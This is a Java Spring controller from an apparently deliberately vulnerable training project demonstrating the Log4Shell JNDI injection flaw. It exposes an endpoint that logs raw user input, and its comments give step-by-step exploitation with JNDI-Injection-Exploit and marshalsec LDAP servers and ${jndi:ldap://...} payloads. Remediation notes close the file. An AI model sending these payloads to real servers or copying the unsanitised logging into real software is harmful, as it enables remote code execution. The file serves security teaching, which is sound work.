package com.madaha.codesecone.controller.AdvancedAttack.deserialize.components;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/log4j")
public class Log4j {

    private static final Logger logger = LogManager.getLogger(Log4j.class);


    /**
     * 1、启动恶意类：
     *      java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A 127.0.0.1
     *
     * 2、传入恶意参数进行漏洞利用。
     *     （1） ldap://127.0.0.1:1389/xxxxx
     *     （2） ${jndi:ldap://127.0.0.1:1389/xxxxx}
     *     （3） http://127.0.0.1:28888/log4j/vuln?input=${jndi:ldap://127.0.0.1:1389/v170or}
     *     （4） http://127.0.0.1:28888/log4j/vuln?input=$%7Bjndi:ldap://127.0.0.1:1389/v170or%7D
     *
     * 3、使用log4j2的漏洞，成功弹出计算器。（发送http请求，需要进行url编码）
     */
    @RequestMapping("/vuln")
    public String vuln(String input) {
        logger.error(input);
        return "Log4j2 JNDI Injection";
    }



    /**
     * 如下：这个需要自己编写 EXP利用类，并且需要自己将恶意类放到http服务中。
     * java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8800/#Exploit
     * java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:65500/\#Exploit
     *
     * 如下：使用如下工具，自动生成存在恶意类地址地址。
     * 注意！！ 这个 “ldap://127.0.0.1:1389/bud5xf” 是自动生成的，工具每次启动时 会改变恶意类的名字。
     * java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a Calculator" -A 127.0.0.1
     * java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A 127.0.0.1
     */
    public static void log4j_Vuln2() {

        //用input局部变量来模拟入侵者输入的内容
        // String input = "${jndi:ldap://127.0.0.1:1389/#Exploit}";
        String input = "${jndi:ldap://127.0.0.1:1389/gvaeft}";

        //这里直接用log4j输入
        logger.error(input);
    }

    public static void main(String[] args) {
        log4j_Vuln2();

        String a="${java:os}";
        logger.error(a);
        logger.error(a);
        logger.error(a);
    }


/**
* 解决方式：（其实如果你了解了这个原理那么解决方式也就一目了然了）
 *
 *    （1）禁用lookup或JNDI服务：
 *          罪魁祸首就是lookup和JNDI，那么直接修改配置文件log4j2.formatMsgNoLookups=True 或 禁用JNDI服务，不过一般产生问题的服务都是线上已经在跑的服务，禁用的时候要注意评估一下是否允许。
 *
 *    （2）升级Apache Log4j：
 *          这次产生的影响范围主要是在Apache Log4j 2.x <= 2.14.1 ，所以直接把Log4j升级即可解决。
*/
}
